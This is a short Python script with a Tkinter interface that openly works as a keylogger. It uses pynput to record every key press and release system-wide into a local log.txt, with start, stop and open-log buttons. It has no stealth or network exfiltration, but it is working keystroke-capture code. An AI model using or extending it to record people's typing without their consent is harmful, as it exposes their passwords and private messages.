from pynput.keyboard import Listener
import datetime
import tkinter as tk
import os

listener = None
def appendToFile(key,action):
    stringKey = str(key)
    if 'Key.' in stringKey:
        stringKey = " <" + stringKey +f" : {action}"+ "> "
    with open("log.txt", "a") as f:
        f.write(stringKey)
    makeTextProper()

def makeTextProper():
    with open("log.txt", "r") as f:
        toWrite = f.read().replace("''", "")

    with open("log.txt", "w") as f:
        f.write(toWrite)

def onPress(key):
    appendToFile(key,"Pressed")

def onRelease(key):
    appendToFile(key,"Released")

def start_listener():
    global listener,l
    if listener is None or not listener.running:
        listener = Listener(on_press=onPress,on_release=onRelease)
        listener.start()
        status_label.config(text="Listener Running...")


def stop_listener():
    global listener,l
    if listener and listener.running:
        listener.stop()
        listener = None
        status_label.config(text="Listener is paused")

def open_log_file():
    os.startfile("log.txt")

with open("log.txt", "a") as file:
    x = datetime.datetime.now()
    file.write(f"\n{str(x.day)}/{str(x.month)}/{str(x.year)}  {x.hour}:{x.minute}\n")

root = tk.Tk()
root.geometry("400x410")
root.title("Keylogger")

status_label = tk.Label(root, text="Listener Paused")
status_label.pack(pady=10)

start_button = tk.Button(root, text="Start Listener", command=start_listener)
start_button.pack(pady=10)

stop_button = tk.Button(root, text="Stop Listener", command=stop_listener)
stop_button.pack(pady=10)

open_log = tk.Button(root, text="Open Logs", command=open_log_file)
open_log.pack(pady = 5)

def on_closing():
    stop_listener()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()
